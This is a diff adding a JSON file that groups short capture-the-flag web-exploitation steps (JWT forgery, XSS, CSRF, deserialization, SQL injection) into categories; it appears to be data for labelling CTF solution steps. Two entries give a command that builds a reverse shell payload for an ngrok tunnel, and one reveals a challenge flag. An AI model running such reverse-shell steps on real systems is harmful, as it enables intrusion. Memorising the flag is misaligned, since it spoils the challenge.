@@ -1,0 +1,52 @@
+{
+    "JWT & Token Manipulation": [
+        "Realised that the token was using the RS256 algorithm.",
+        "Use this method to bruteforce the admin token one character at a time.",
+        "Recognize that the '.env' file contains the JWT secret."
+    ],
+    "Flag Acquisition": [
+        "Obtained the first flag.",
+        "Used the found object",
+        "Obtained the flag 'CTFSG{d0nT_toUcH_mY_c00k13s}'.",
+        "Used the flag present in the JSON response."
+    ],
+    "Web Exploitation & Attacks": [
+        "Formulate the final URL.",
+        "Enter an apostrophe in the password field.",
+        "Noted the existence of the second request 'GET /save.php HTTP/1.1'.",
+        "Exploit the XSS vulnerability to send a POST request.",
+        "Capture the request, including the Admin-Key.",
+        "Compress the malicious Java serialized object",
+        "CSRF payload fetches /api/flag",
+        "Identify a potential PHP deserialization vulnerability in cookie.php",
+        "Devise a strategy involving acquiring the secret key from the store object.",
+        "Realize that there is no vulnerability in the ws.origin.",
+        "Realize that the decryption key can be obtained by supplying a 'key_id' in the HTTP headers",
+        "Use the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel.",
+        "Noted execution of argument as command.",
+        "Comprehend the loose comparison ('==') operator used in PHP to compare two md5 hashes",
+        "Locate the 'login' method in [dogooo_comments.py](dogooo_comments.py) file.",
+        "Continued to analyze the output from SQLmap.",
+        "Craft a JavaScript snippet that sends a GET request to the '/profile/follow' endpoint."
+    ],
+    "Server Interaction & Information Extraction": [
+        "Ran PHP code while XML parsing is performed.",
+        "The XML payload was designed to extract information from /var/www.",
+        "Trim a section of the server response using slicing.",
+        "Connect to URL",
+        "Verify the current size of the tar archive."
+    ],
+    "Code Analysis & Exploitation": [
+        "Focus on app.js.",
+        "Leverage 'lower' filter to bypass 'getitem' string."
+    ],
+    "Web Navigation & Interaction": [
+        "Visit the webpage.",
+        "Extract the understanding of the possibility to upload an image."
+    ],
+    "Miscellaneous Actions": [
+        "Used the found object",
+        "Delivered the payload via the crafted session cookie",
+        "Used the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel."
+    ]
+}
